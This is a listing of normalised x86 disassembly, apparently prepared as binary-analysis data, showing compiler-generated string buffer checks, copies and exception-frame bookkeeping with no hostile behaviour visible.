lea eax [ ebp - 0x58 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x370 ] eax
cmp [ ebp - 0x370 ] 0x1
ja r-xdata
mov [ ebp - 0x32c ] 0xffffffff
mov ecx [ ebp - 0x328 ]
mov [ ebp - 0x330 ] ecx
mov eax [ ebp - 0x40 ]
cmp eax [ ebp - 0x330 ]
jae r-xdata
mov ecx 0xf
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x63d ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x25c ]
mov [ ebp - 0x638 ] ecx
mov eax [ ebp - 0x638 ]
mov [ ebp - 0x63c ] eax
mov edx [ ebp - 0x63c ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
mov ecx [ ebp - 0x4b8 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x4cc ] eax
cmp [ ebp - 0x4cc ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x1c0 ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x1a0 ] eax
add ecx eax
mov [ ebp - 0x4c8 ] ecx
mov edx [ ebp - 0x4c8 ]
mov cl [ ebp - 0x4c1 ]
mov [ edx ] cl
mov eax [ ebp - 0x4b8 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
mov edi [ ebp - 0x3f4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x43c ] eax
cmp [ ebp - 0x43c ] 0x1
ja r-xdata
mov [ ebp - 0x3f8 ] 0xffffffff
mov ecx [ ebp - 0x3f4 ]
mov [ ebp - 0x3fc ] ecx
mov eax [ ebp - 0xec ]
cmp eax [ ebp - 0x3fc ]
jae r-xdata
mov edx [ ebp - 0x370 ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ ebp - 0x40 ]
sub ecx [ ebp - 0x330 ]
cmp ecx [ ebp - 0x32c ]
jae r-xdata
lea edx [ ebp - 0x60 ]
push edx
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
mov ecx [ ebp - 0x59c ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x5b0 ] eax
cmp [ ebp - 0x5b0 ] 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x26c ]
push edx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebp - 0x24c ] eax
add ecx eax
mov [ ebp - 0x5ac ] ecx
mov edx [ ebp - 0x5ac ]
mov cl [ ebp - 0x5a5 ]
mov [ edx ] cl
mov eax [ ebp - 0x59c ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
xor edx edx
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x560 ] eax
mov eax [ ebp - 0x560 ]
mov cl [ ebp - 0x559 ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0x264
lea edx [ ebp - 0x1c0 ]
cmp edx [ ebp - 0x4b8 ]
jne r-xdata
mov [ ebp - 0x4cc ] 0xffffffff
mov edx [ ebp - 0x43c ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ ebp - 0xec ]
sub ecx [ ebp - 0x3fc ]
cmp ecx [ ebp - 0x3f8 ]
jae r-xdata
lea edx [ ebp - 0x10c ]
push edx
call sub_4bc8cc
pop ecx
cmp edi [ ebp - 0x3c ]
jbe r-xdata
lea eax [ ebp - 0x60 ]
push eax
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0x32c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x330 ]
mov [ ebp - 0x32c ] eax
xor edx edx
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x644 ] eax
mov eax [ ebp - 0x644 ]
mov cl [ ebp - 0x63d ]
mov [ eax ] cl
mov [ ebx + 0x10 ] 0x2f4
lea edx [ ebp - 0x26c ]
cmp edx [ ebp - 0x59c ]
jne r-xdata
mov [ ebp - 0x5b0 ] 0xffffffff
mov eax [ ebp - 0x4cc ]
mov [ ebp - 0x514 ] eax
lea edx [ ebp - 0x1b8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x518 ] eax
cmp [ ebp - 0x518 ] 0x1
ja r-xdata
mov [ ebp - 0x4d0 ] 0xffffffff
mov ecx [ ebp - 0x4cc ]
mov [ ebp - 0x4d4 ] ecx
mov eax [ ebp - 0x1a0 ]
cmp eax [ ebp - 0x4d4 ]
jae r-xdata
cmp edi [ ebp - 0xe8 ]
jbe r-xdata
lea eax [ ebp - 0x10c ]
push eax
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0x3f8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0xec ]
sub eax [ ebp - 0x3fc ]
mov [ ebp - 0x3f8 ] eax
test edi edi
jne r-xdata
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x60 ]
push ecx
push edi
push eax
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x350 ] eax
cmp [ ebp - 0x40 ] 0x0
jae r-xdata
mov edx [ ebp - 0x40 ]
sub edx [ ebp - 0x330 ]
sub edx [ ebp - 0x32c ]
mov [ ebp - 0x334 ] edx
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
mov eax [ ebp - 0x5b0 ]
mov [ ebp - 0x5f8 ] eax
lea edx [ ebp - 0x264 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x5fc ] eax
cmp [ ebp - 0x5fc ] 0x1
ja r-xdata
mov [ ebp - 0x5b4 ] 0xffffffff
mov ecx [ ebp - 0x5b0 ]
mov [ ebp - 0x5b8 ] ecx
mov eax [ ebp - 0x24c ]
cmp eax [ ebp - 0x5b8 ]
jae r-xdata
mov ecx [ ebp - 0x518 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebp - 0x1a0 ]
sub ecx [ ebp - 0x4d4 ]
cmp ecx [ ebp - 0x4d0 ]
jae r-xdata
lea edx [ ebp - 0x1c0 ]
push edx
call sub_4bc8cc
pop ecx
test edi edi
jne r-xdata
mov ecx [ ebp - 0xec ]
lea eax [ ebp - 0x10c ]
push ecx
push edi
push eax
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x41c ] eax
cmp [ ebp - 0xec ] 0x0
jae r-xdata
mov edx [ ebp - 0xec ]
sub edx [ ebp - 0x3fc ]
sub edx [ ebp - 0x3f8 ]
mov [ ebp - 0x400 ] edx
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x389 ] 0x0
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
mov ecx [ ebp - 0x40 ]
cmp ecx [ ebp - 0x350 ]
jae r-xdata
lea edx [ ebp - 0x60 ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x5fc ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebp - 0x24c ]
sub ecx [ ebp - 0x5b8 ]
cmp ecx [ ebp - 0x5b4 ]
jae r-xdata
lea edx [ ebp - 0x26c ]
push edx
call sub_4bc8cc
pop ecx
mov edx [ ebp - 0x19c ]
cmp edx [ ebp - 0x514 ]
jae r-xdata
lea eax [ ebp - 0x1c0 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x514 ]
jae r-xdata
cmp [ ebp - 0x4d0 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x1a0 ]
sub eax [ ebp - 0x4d4 ]
mov [ ebp - 0x4d0 ] eax
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x455 ] 0x0
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xec ]
cmp ecx [ ebp - 0x41c ]
jae r-xdata
lea edx [ ebp - 0x10c ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0xfc ]
mov ecx [ ebp - 0xfc ]
jmp r-xdata
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x60 ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0xc0 ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x310 ] eax
mov ecx rw-data
mov eax [ ebp - 0x38 ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0x38 ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x38 ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x38 ]
mov [ eax ] ecx
mov [ rw-data ] 0x100
mov edx [ ebp - 0x310 ]
push edx
mov ecx [ ebp - 0x38 ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x120
mov eax [ ebp - 0x38 ]
jmp r-xdata
mov edx [ ebp - 0x328 ]
mov [ ebp - 0x394 ] edx
mov ecx [ ebp - 0x314 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
jmp r-xdata
cmp [ ebp - 0x350 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x350 ] eax
lea eax [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
jmp r-xdata
add ecx [ ebp - 0x330 ]
add ecx [ ebp - 0x32c ]
mov [ ebp - 0x338 ] ecx
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
mov edx [ ebp - 0x248 ]
cmp edx [ ebp - 0x5f8 ]
jae r-xdata
lea eax [ ebp - 0x26c ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x5f8 ]
jae r-xdata
cmp [ ebp - 0x5b4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24c ]
sub eax [ ebp - 0x5b8 ]
mov [ ebp - 0x5b4 ] eax
cmp [ ebp - 0x514 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a0 ]
push eax
mov edx [ ebp - 0x514 ]
push edx
lea ecx [ ebp - 0x1c0 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x4f4 ] eax
cmp [ ebp - 0x1a0 ] 0x0
jae r-xdata
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4d4 ]
sub edx [ ebp - 0x4d0 ]
mov [ ebp - 0x4d8 ] edx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x10c ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x16c ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x3dc ] eax
mov ecx rw-data
mov eax [ ebp - 0xe4 ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0xe4 ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0xe4 ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0xe4 ]
mov [ eax ] ecx
mov [ rw-data ] 0x100
mov edx [ ebp - 0x3dc ]
push edx
mov ecx [ ebp - 0xe4 ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x1b0
mov eax [ ebp - 0xe4 ]
jmp r-xdata
mov edx [ ebp - 0x3f4 ]
mov [ ebp - 0x460 ] edx
mov ecx [ ebp - 0x3e0 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0xfc ]
mov eax [ ebp - 0xfc ]
jmp r-xdata
cmp [ ebp - 0x41c ] 0x0
jbe r-xdata
mov eax [ ebp - 0xec ]
mov [ ebp - 0x41c ] eax
lea eax [ ebp - 0xfc ]
mov eax [ ebp - 0xfc ]
jmp r-xdata
add ecx [ ebp - 0x3fc ]
add ecx [ ebp - 0x3f8 ]
mov [ ebp - 0x404 ] ecx
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
mov [ ebp - 0x304 ] eax
sub [ ebx + 0x1c ] 0x4
push 0x2
lea edx [ ebp - 0xc0 ]
push edx
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
mov edx [ ebp - 0x314 ]
add edx 0x10
mov eax [ ebp - 0x314 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x40 ] edx
add eax edx
mov [ ebp - 0x390 ] eax
mov eax [ ebp - 0x390 ]
mov cl [ ebp - 0x389 ]
mov [ eax ] cl
mov edx [ ebp - 0x40 ]
sub edx [ ebp - 0x350 ]
mov [ ebp - 0x354 ] edx
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
lea eax [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
jmp r-xdata
add eax [ ebp - 0x330 ]
mov [ ebp - 0x33c ] eax
mov edx [ ebp - 0x334 ]
push edx
mov ecx [ ebp - 0x338 ]
push ecx
mov eax [ ebp - 0x33c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x40 ]
sub edx [ ebp - 0x32c ]
mov [ ebp - 0x340 ] edx
mov ecx [ ebp - 0x340 ]
mov [ ebp - 0x344 ] ecx
mov [ ebp - 0x345 ] 0x0
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
cmp [ ebp - 0x5f8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24c ]
push eax
mov edx [ ebp - 0x5f8 ]
push edx
lea ecx [ ebp - 0x26c ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x5d8 ] eax
cmp [ ebp - 0x24c ] 0x0
jae r-xdata
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5b8 ]
sub edx [ ebp - 0x5b4 ]
mov [ ebp - 0x5bc ] edx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
cmp [ ebp - 0x514 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x531 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov ecx [ ebp - 0x1a0 ]
cmp ecx [ ebp - 0x4f4 ]
jae r-xdata
lea edx [ ebp - 0x1c0 ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
mov [ ebp - 0x3d0 ] eax
sub [ ebx + 0x1c ] 0x4
push 0x2
lea edx [ ebp - 0x16c ]
push edx
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
mov edx [ ebp - 0x3e0 ]
add edx 0x10
mov eax [ ebp - 0x3e0 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xec ] edx
add eax edx
mov [ ebp - 0x45c ] eax
mov eax [ ebp - 0x45c ]
mov cl [ ebp - 0x455 ]
mov [ eax ] cl
mov edx [ ebp - 0xec ]
sub edx [ ebp - 0x41c ]
mov [ ebp - 0x420 ] edx
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
lea eax [ ebp - 0xfc ]
mov eax [ ebp - 0xfc ]
jmp r-xdata
add eax [ ebp - 0x3fc ]
mov [ ebp - 0x408 ] eax
mov edx [ ebp - 0x400 ]
push edx
mov ecx [ ebp - 0x404 ]
push ecx
mov eax [ ebp - 0x408 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xec ]
sub edx [ ebp - 0x3f8 ]
mov [ ebp - 0x40c ] edx
mov ecx [ ebp - 0x40c ]
mov [ ebp - 0x410 ] ecx
mov [ ebp - 0x411 ] 0x0
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
lea eax [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov [ ebp - 0x398 ] edx
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
lea ecx [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
jmp r-xdata
mov edx [ ebp - 0x344 ]
mov [ ebp - 0x40 ] edx
add eax edx
mov [ ebp - 0x34c ] eax
mov eax [ ebp - 0x34c ]
mov cl [ ebp - 0x345 ]
mov [ eax ] cl
cmp [ ebp - 0x5f8 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x615 ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x24c ]
cmp ecx [ ebp - 0x5d8 ]
jae r-xdata
lea edx [ ebp - 0x26c ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x1c0 ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x220 ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x4b4 ] eax
mov ecx rw-data
mov eax [ ebp - 0x198 ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0x198 ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x198 ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x198 ]
mov [ eax ] ecx
mov [ rw-data ] 0x100
mov edx [ ebp - 0x4b4 ]
push edx
mov ecx [ ebp - 0x198 ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x288
mov eax [ ebp - 0x198 ]
jmp r-xdata
mov edx [ ebp - 0x4cc ]
mov [ ebp - 0x53c ] edx
mov ecx [ ebp - 0x4b8 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
cmp [ ebp - 0x4f4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x1a0 ]
mov [ ebp - 0x4f4 ] eax
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
add ecx [ ebp - 0x4d4 ]
add ecx [ ebp - 0x4d0 ]
mov [ ebp - 0x4dc ] ecx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea eax [ ebp - 0xfc ]
mov eax [ ebp - 0xfc ]
jmp r-xdata
mov [ ebp - 0x464 ] edx
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
lea ecx [ ebp - 0xfc ]
mov ecx [ ebp - 0xfc ]
jmp r-xdata
mov edx [ ebp - 0x410 ]
mov [ ebp - 0xec ] edx
add eax edx
mov [ ebp - 0x418 ] eax
mov eax [ ebp - 0x418 ]
mov cl [ ebp - 0x411 ]
mov [ eax ] cl
lea ecx [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
jmp r-xdata
mov [ ebp - 0x39c ] eax
mov edx [ ebp - 0x394 ]
push edx
mov ecx [ ebp - 0x398 ]
push ecx
mov eax [ ebp - 0x39c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x328 ]
mov [ ebp - 0x3a0 ] edx
mov [ ebp - 0x3a1 ] 0x0
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
lea eax [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
jmp r-xdata
add ecx [ ebp - 0x350 ]
mov [ ebp - 0x358 ] ecx
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
inc [ ebx + 0x1c ]
lea eax [ ebp - 0x26c ]
push eax
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x2cc ]
push edx
call sub_4bab6c
add [ ebx + 0x1c ] 0x4
mov [ ebp - 0x598 ] eax
mov ecx rw-data
mov eax [ ebp - 0x244 ]
add esp 0x8
mov [ eax ] ecx
xor ecx ecx
mov edx [ ebp - 0x244 ]
mov eax rw-data
mov [ edx + 0x4 ] ecx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x244 ]
mov [ edx ] eax
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x244 ]
mov [ eax ] ecx
mov [ rw-data ] 0x100
mov edx [ ebp - 0x598 ]
push edx
mov ecx [ ebp - 0x244 ]
add ecx 0x8
push ecx
call sub_4b65f4
add esp 0x8
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x318
mov eax [ ebp - 0x244 ]
jmp r-xdata
mov edx [ ebp - 0x5b0 ]
mov [ ebp - 0x620 ] edx
mov ecx [ ebp - 0x59c ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
cmp [ ebp - 0x5d8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24c ]
mov [ ebp - 0x5d8 ] eax
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
add ecx [ ebp - 0x5b8 ]
add ecx [ ebp - 0x5b4 ]
mov [ ebp - 0x5c0 ] ecx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov [ ebp - 0x4a8 ] eax
sub [ ebx + 0x1c ] 0x4
push 0x2
lea edx [ ebp - 0x220 ]
push edx
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov edx [ ebp - 0x4b8 ]
add edx 0x10
mov eax [ ebp - 0x4b8 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x538 ] eax
mov eax [ ebp - 0x538 ]
mov cl [ ebp - 0x531 ]
mov [ eax ] cl
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4f4 ]
mov [ ebp - 0x4f8 ] edx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
add eax [ ebp - 0x4d4 ]
mov [ ebp - 0x4e0 ] eax
mov edx [ ebp - 0x4d8 ]
push edx
mov ecx [ ebp - 0x4dc ]
push ecx
mov eax [ ebp - 0x4e0 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4d0 ]
mov [ ebp - 0x4e4 ] edx
mov ecx [ ebp - 0x4e4 ]
mov [ ebp - 0x4e8 ] ecx
mov [ ebp - 0x4e9 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea ecx [ ebp - 0xfc ]
mov ecx [ ebp - 0xfc ]
jmp r-xdata
mov [ ebp - 0x468 ] eax
mov edx [ ebp - 0x460 ]
push edx
mov ecx [ ebp - 0x464 ]
push ecx
mov eax [ ebp - 0x468 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x3f4 ]
mov [ ebp - 0x46c ] edx
mov [ ebp - 0x46d ] 0x0
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
lea eax [ ebp - 0xfc ]
mov eax [ ebp - 0xfc ]
jmp r-xdata
add ecx [ ebp - 0x41c ]
mov [ ebp - 0x424 ] ecx
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
mov eax [ ebp - 0x3a0 ]
mov [ ebp - 0x40 ] eax
add ecx eax
mov [ ebp - 0x3a8 ] ecx
mov edx [ ebp - 0x3a8 ]
mov cl [ ebp - 0x3a1 ]
mov [ edx ] cl
lea eax [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov [ ebp - 0x35c ] eax
mov edx [ ebp - 0x354 ]
push edx
mov ecx [ ebp - 0x358 ]
push ecx
mov eax [ ebp - 0x35c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x40 ]
sub edx [ ebp - 0x350 ]
mov [ ebp - 0x360 ] edx
mov ecx [ ebp - 0x360 ]
mov [ ebp - 0x364 ] ecx
mov [ ebp - 0x365 ] 0x0
cmp [ ebp - 0x3c ] 0x10
jb r-xdata
mov [ ebp - 0x58c ] eax
sub [ ebx + 0x1c ] 0x4
push 0x2
lea edx [ ebp - 0x2cc ]
push edx
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov edx [ ebp - 0x59c ]
add edx 0x10
mov eax [ ebp - 0x59c ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x61c ] eax
mov eax [ ebp - 0x61c ]
mov cl [ ebp - 0x615 ]
mov [ eax ] cl
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5d8 ]
mov [ ebp - 0x5dc ] edx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
add eax [ ebp - 0x5b8 ]
mov [ ebp - 0x5c4 ] eax
mov edx [ ebp - 0x5bc ]
push edx
mov ecx [ ebp - 0x5c0 ]
push ecx
mov eax [ ebp - 0x5c4 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5b4 ]
mov [ ebp - 0x5c8 ] edx
mov ecx [ ebp - 0x5c8 ]
mov [ ebp - 0x5cc ] ecx
mov [ ebp - 0x5cd ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
mov [ ebp - 0x540 ] edx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
mov edx [ ebp - 0x4e8 ]
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x4f0 ] eax
mov eax [ ebp - 0x4f0 ]
mov cl [ ebp - 0x4e9 ]
mov [ eax ] cl
mov eax [ ebp - 0x46c ]
mov [ ebp - 0xec ] eax
add ecx eax
mov [ ebp - 0x474 ] ecx
mov edx [ ebp - 0x474 ]
mov cl [ ebp - 0x46d ]
mov [ edx ] cl
lea eax [ ebp - 0xfc ]
mov eax [ ebp - 0xfc ]
jmp r-xdata
mov [ ebp - 0x428 ] eax
mov edx [ ebp - 0x420 ]
push edx
mov ecx [ ebp - 0x424 ]
push ecx
mov eax [ ebp - 0x428 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xec ]
sub edx [ ebp - 0x41c ]
mov [ ebp - 0x42c ] edx
mov ecx [ ebp - 0x42c ]
mov [ ebp - 0x430 ] ecx
mov [ ebp - 0x431 ] 0x0
cmp [ ebp - 0xe8 ] 0x10
jb r-xdata
mov edx [ ebp - 0x364 ]
mov [ ebp - 0x40 ] edx
add eax edx
mov [ ebp - 0x36c ] eax
mov eax [ ebp - 0x36c ]
mov cl [ ebp - 0x365 ]
mov [ eax ] cl
jmp r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
mov [ ebp - 0x624 ] edx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
mov edx [ ebp - 0x5cc ]
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x5d4 ] eax
mov eax [ ebp - 0x5d4 ]
mov cl [ ebp - 0x5cd ]
mov [ eax ] cl
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
mov [ ebp - 0x544 ] eax
mov edx [ ebp - 0x53c ]
push edx
mov ecx [ ebp - 0x540 ]
push ecx
mov eax [ ebp - 0x544 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x4cc ]
mov [ ebp - 0x548 ] edx
mov [ ebp - 0x549 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
add ecx [ ebp - 0x4f4 ]
mov [ ebp - 0x4fc ] ecx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov edx [ ebp - 0x430 ]
mov [ ebp - 0xec ] edx
add eax edx
mov [ ebp - 0x438 ] eax
mov eax [ ebp - 0x438 ]
mov cl [ ebp - 0x431 ]
mov [ eax ] cl
jmp r-xdata
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
mov [ ebp - 0x628 ] eax
mov edx [ ebp - 0x620 ]
push edx
mov ecx [ ebp - 0x624 ]
push ecx
mov eax [ ebp - 0x628 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x5b0 ]
mov [ ebp - 0x62c ] edx
mov [ ebp - 0x62d ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
add ecx [ ebp - 0x5d8 ]
